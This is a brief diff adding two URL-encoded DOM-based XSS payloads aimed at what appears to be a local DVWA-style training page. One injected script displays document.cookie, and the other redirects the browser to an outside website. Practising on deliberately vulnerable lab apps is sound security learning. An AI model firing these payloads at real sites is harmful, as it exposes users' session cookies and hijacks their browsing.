@@ -1,0 +1,3 @@
+http://localhost/vulnerabilities/xss_d/#%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://localhost/vulnerabilities/xss_d/#%3Cscript%3Ealert(window.location.assign("http://www.devmedia.com.br"))%3C/script%3E
